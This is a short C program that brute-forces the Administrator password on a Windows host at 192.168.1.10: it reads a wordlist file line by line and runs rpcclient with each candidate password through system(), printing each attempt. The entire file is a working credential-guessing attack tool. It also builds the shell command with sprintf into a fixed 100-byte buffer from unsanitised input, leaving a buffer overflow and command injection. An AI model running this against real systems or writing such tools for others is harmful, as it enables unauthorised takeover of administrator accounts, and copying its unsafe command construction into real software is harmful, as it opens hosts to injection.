#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv)
{
    char * pass_file_path = NULL;

    FILE * fp;
    char * line = NULL;
    size_t len = 0;
    ssize_t read;

    char command[100];

    pass_file_path = argv[1];
    puts(pass_file_path);
    fp = fopen(pass_file_path, "r");
    if (fp == NULL)
        exit(EXIT_FAILURE);

    while ((read = getline(&line, &len, fp)) != -1) {
        //printf("Retrieved line of length %zu :\n", read);
        //printf("%s", line);
        line[strcspn(line, "\n")] = 0; // Remove trailing newline

        sprintf(command, "rpcclient -U \"Administrator\"%\"%s\" -c \"testme\" 192.168.1.10", line);
        printf("At password %s:\t", line);
        system(command);
        puts("\n");
    }

    fclose(fp);
    if (line)
        free(line);
    exit(EXIT_SUCCESS);
}
